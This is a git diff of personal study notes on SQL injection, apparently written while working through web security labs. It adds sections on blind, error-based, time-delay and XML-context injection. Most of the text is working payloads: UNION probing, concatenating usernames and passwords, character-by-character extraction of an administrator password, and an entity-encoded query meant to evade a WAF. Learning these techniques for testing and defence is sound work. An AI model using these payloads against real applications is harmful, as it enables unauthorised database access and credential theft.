@@ -8,7 +8,7 @@ we use order by statment :
 	' order by 2 --, 
 	' order by 3 --, ...etc
 
-untill getting an error.
+until getting an error.
 
 or
 	' UNION SELECT NULL--
@@ -18,7 +18,7 @@ or
 for oracle, specific syntax `' UNION SELECT NULL FROM DUAL--`
 
 Finding columns with a useful data type
-we use the followinf payload when we know the number of columns : 
+we use the following payload when we know the number of columns : 
 
 	' UNION SELECT 'a',NULL,NULL,NULL--
 	' UNION SELECT NULL,'a',NULL,NULL--
@@ -39,7 +39,7 @@ another example when columns are not even
 	UNION SELECT username, 2, 3, 4 from passwords-- '
 
 
-Retreiving multiple values within the same column we can use contact depending on the sql syntax
+Retrieving multiple values within the same column we can use contact depending on the sql syntax
 
 	' UNION SELECT username || '~' || password FROM users--
 
@@ -78,6 +78,7 @@ and then Get the data you need :
 	select username_ecephv,password_akjxku from users_xemvgh where username_ecephv = 'administrator' --
 
 # Blind SQL Injection :
+## Conditional response
 blind sql injection, is when we have an injection without the visual output, the vuln occurs at the backend 
 
 we start wy trigerring a false boolean logic and see if there is any change the page for example :
@@ -87,6 +88,62 @@ we start wy trigerring a false boolean logic and see if there is any change the 
 
 first we start by knowing the length of the password for example : 
 
-	TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
-	
-	xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
+	xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+	xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'
+	xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' 
+
+and keep looping for all the entries until the password length.
+
+## Error based injection
+sometime we don't have some change in the web page'e behavior, we will trigger a an error and see the reponse the HTTP header.
+
+	xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
+	xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a'
+
+if we have a dirretent reponse for both quesries than we can suppose we have a blind sql injection error based.
+we can go with the following payload :
+
+	xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a'
+### Trigger another error based sqli with output
+
+First thing try the sql injection if there is a potential injection : 
+
+	TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
+
+it should resolve an error : `Argument END should be a boolean`
+and to resolve this error 
+
+	TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+
+so once the error is resolved we can inject a `select` statement.
+
+	TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
+
+or 
+
+		TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users limit 1) AS int)--
+
+## Time delay SQLi:
+
+Some times the developper handle errors, but that doesn't mean the injection doesn't exist.
+To test if the injction exists example :
+
+	'; IF (1=2) WAITFOR DELAY '0:0:10'--
+	'; IF (1=1) WAITFOR DELAY '0:0:10'--
+
+Using this technique, we can retrieve data by testing one character at a time:
+
+	'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
+ depending on the DB, there are multipple syntaxes
+
+ ## OAST techniques :
+ //need to see this section in HTB, it's paid in Portswigger :'(
+
+## SQL injection in different contexts
+the SQL injections could also exist in JSON or XML format.
+also, it exist ways to obfuscate the payload to evade WAFs:
+
+	<stockCheck>
+		<productId>123</productId>
+		<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+	</stockCheck>
